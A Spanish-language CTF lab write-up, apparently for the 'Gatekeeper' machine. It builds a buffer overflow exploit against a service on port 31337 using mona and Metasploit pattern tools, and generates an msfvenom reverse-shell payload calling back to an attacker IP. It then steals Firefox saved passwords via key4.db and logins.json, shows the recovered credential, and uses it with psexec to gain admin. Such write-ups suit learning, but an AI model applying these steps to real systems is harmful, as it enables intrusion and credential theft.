Hacemos el escaneo de nmap
![[Pasted image 20240725075130.png]]

Añadimos el nombre de la maquina a nuestro `hosts`
![[Pasted image 20240725075308.png]]

Detectamos que es un sistema con `Windows 7 Professional 7601 Service Pack 1 x64` y encontramos el nombre y dominio de la maquina `GATEKEEPER`
```
Windows 7 Professional 7601 Service Pack 1 x64
GATEKEEPER
```
![[Pasted image 20240725075812.png]]

Enumeramos el protocolo SMB y nos lista 
![[Pasted image 20240725075659.png]]

Nos conectamos y encontramos una carpeta que llama la atención
![[Pasted image 20240725090029.png]]

Al acceder a la carpeta encontramos un ejecutable
![[Pasted image 20240725090651.png]]

Nos lo descargamos
![[Pasted image 20240725090725.png]]

Continuamos enumerando los puertos restantes y en el 3389 no encontramos respuesta
![[Pasted image 20240725091104.png]]

Continuamos con el 31337 y encontramos que al escribir caracteres encontramos que nos devuelve una respuesta
![[Pasted image 20240725092249.png]]

Ahora generamos una cadena de mil caracteres para comprobar si el programa se crashea
```
python -c "print('A'*1000)"
```
![[Pasted image 20240725092447.png]]

Como vemos el programa crashea
![[Pasted image 20240725092626.png]]

Ahora nos transferimos el archivo que nos hemos descargado previamente a una maquina windows para analizar el BoF y crear el exploit
![[Pasted image 20240725094557.png]]

Para saber bien como funciona el binario que tenemos lo ejecutamos en nuestra maquina y encontramos que esta a la escucha
![[Pasted image 20240725094952.png]]

Nos conectamos desde nuestra maquina de Kali por el mismo puerto que corre en la maquina victima
![[Pasted image 20240725095307.png]]

Volvemos a la maquina Windows y podemos ver la cantidad de bytes que recibe y devuelve
![[Pasted image 20240725095357.png]]

Ahora ejecutamos el programa en innmunty debbuger para empezar a analizarlo y ejecutamos el programa, si ahora realizamos un escaneo podemos ver que nos ha abierto el puerto 31337 en nuestra maquina windows
![[Pasted image 20240725101134.png]]

Ahora usaremos el script de mona y establecemos un directorio de trabajo donde vamos a trabajar con el inmunity debugger, por lo que hay que ejecutar el siguiente comando:
```python
!mona config -set workingfolder C:\Users\wolf\Desktop\bof
```

Ahora preparamos el script de fuzzing y lo ejecutamos para saber cuando crashea el binario
![[Pasted image 20240725101729.png]]

Al ejecutarlo encontramos que crashea a los 100 bytes
![[Pasted image 20240725101933.png]]

En la maquina Windows podemos ver que el progrma crashea
![[Pasted image 20240725102309.png]]

Esta prueba no funciono ya que si modificamos el script he indicamos que coja solo un byte también crashea
![[Pasted image 20240725102549.png]]

Así que pasamos a intentar descubrirlo, antes hemos probado y hemos visto que craseha con 1000 bytes, así que creamos los 1000 caracteres con el modulo
```Bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Y configuramos el exploit añadiendo en el apartado de payload los 1000 caracteres
![[Pasted image 20240725105059.png]]

Ahora volvemos al inminuty debbuger y configuramos mona antes de ejecutar el exploit, añadimos el valos 1000 sin saber exactamente cuando peta pero si que esta en el rango
```
!mona findmsp -distance 1000
```

Ejecutamos el payload
![[Pasted image 20240725105123.png]]

Y el EIP nos da el siguiente resultado
```
39654138
```
![[Pasted image 20240725111050.png]]

Ahora ejecutamos el siguiente comando
```Bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 39654138
```
![[Pasted image 20240725111203.png]]
- `-l`: Para indicar los bytes que hemos utilizado
- `-q`: Para especificar el EIP que nos ha dado después de ejecutar el payload

Y ya habremos obtenido el offset
```
146
```

Ahora añadimos a nuestro paylaod el offset y el campo retn que suele ser siempre el mismo valor
![[Pasted image 20240725111553.png]]

Una vez añadidos los campos volvemos a ejecutar el binario y posteriormente ejecutamos el exploit con los campos modificados y deberiamos obtener el siguiente `EIP`
```
42424242
```
![[Pasted image 20240725112135.png]]

Ahora generamos los badchars
![[Pasted image 20240725122854.png]]

Y los añadimos en el apartado de paylaod del exploit
![[Pasted image 20240725123054.png]]

Y ahora vamos ejecutar el siguiente comando en el Immunity `!mona bytearray -b "\x00"` para que tenga un archivo con el que comparar el de la aplicación, y si hay algún bad char nos lo llegaría a mostrar:
```
!mona bytearray -b "\x00"
```
![[Pasted image 20240710090941.png]]

Y vemos que ya nos aparece en la carpeta
![[Pasted image 20240725123306.png]]

Ahora volvemos a ejecutar el binario en el inmmunity debbuger y ejecutamos el paylaod, en la salida obtenemos el ESP
```
071D1954
```
![[Pasted image 20240725123741.png]]

Comprobamos la existencia de badchars y nos encuentra el x0a
```
!mona compare -f C:\Users\wolf\Desktop\bof\bytearray.bin -a 071D1954
```
![[Pasted image 20240725124459.png]]

Lo eliminamos del exploit
![[Pasted image 20240725124948.png]]

Y ahora ejectamos el siguiente comandos para buscar el `pointer`
```
!mona jmp -r esp -cpb "\x00\x0a"
```
![[Pasted image 20240725125422.png]]

Ahora con el numero obtenido buscaremos el valor de `JMP ESP` el cual nos dara el valor `retn` buscamos
```
0x080414c3
```
![[Pasted image 20240725125714.png]]

Y lo tenemos por aqui
```
080414C3
```
![[Pasted image 20240725130731.png]]

Ya lo tenemos todo para preparar el payload, primero ejecutamos msfvenom
```Bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.206 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```
![[Pasted image 20240725130258.png]]

Lo copiamos y pegamos en nuestro exploit
![[Pasted image 20240725130429.png]]

Y cambiamos las siguientes variables, donde la variable retn es el número del jmp `080414C3`  pero al revés; y el padding significa el conjunto de datos adicionales que se añaden a la estructura de datos.
```Python
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
```
![[Pasted image 20240725131029.png]]

Y ya tendriamos el paylaod preparado
![[Pasted image 20240725131135.png]]

Ahora ejecutamos el payload y ya obtendriamos la reverse shell
![[Pasted image 20240725131326.png]]
![[Pasted image 20240725131345.png]]

Obtención de la bandera de user
![[Pasted image 20240725131952.png]]

Ahora buscaremos escalar privilegios para obtener acceso a `SYSTEM`, comenzamos revisando los permisos que tenemos
![[Pasted image 20240725132121.png]]

Destaca que podemos ver en el escritorio un acceso directo a Firefox
![[Pasted image 20240725132913.png]]

Ahora copiaremos los dos siguientes archivos para intentar obtener las credenciales de los usuarios de firefox, la primera es `key4.db
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db
```
![[Pasted image 20240726072109.png]]
Este archivo es una base de datos que almacena las claves de cifrado utilizadas por Firefox para proteger las contraseñas guardadas. Desde la versión 58 de Firefox, se utiliza el archivo `key4.db` en lugar del anterior `key3.db`. Este archivo contiene las claves maestras que cifran y descifran las contraseñas almacenadas, lo que significa que sin la clave maestra, las contraseñas guardadas en `logins.json` no pueden ser fácilmente descifradas.

Y el sigueinte archivo
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json
```
![[Pasted image 20240726072742.png]]
Este archivo contiene las contraseñas guardadas por el usuario en formato JSON. Cada entrada en este archivo tiene detalles como el sitio web, el nombre de usuario y la contraseña cifrada. Sin embargo, para poder descifrar estas contraseñas, se necesita la clave que está almacenada en el archivo `key4.db`.

Ahora accedemos al fichero compartido por smb y nos descargamos los ficheros
![[Pasted image 20240726074359.png]]
![[Pasted image 20240726074438.png]]

Ahora podemos usar la herrramienta firepwd la cual podemos utilizar para extraer las contraseñas
```
https://github.com/lclevy/firepwd
```

Descargamos el script y al ejecutarlo nos encuentra unas credenciales
```
mayor:8CL7O1N78MdrCIsV
```
![[Pasted image 20240726075116.png]]
![[Pasted image 20240726075150.png]]

Accedemos con psexec y ya somos admin
```
psexec.py WORKGROUP/mayor:8CL7O1N78MdrCIsV@10.10.3.123
```
![[Pasted image 20240726080845.png]]

Y obtenemos la bandera de root
![[Pasted image 20240726081006.png]]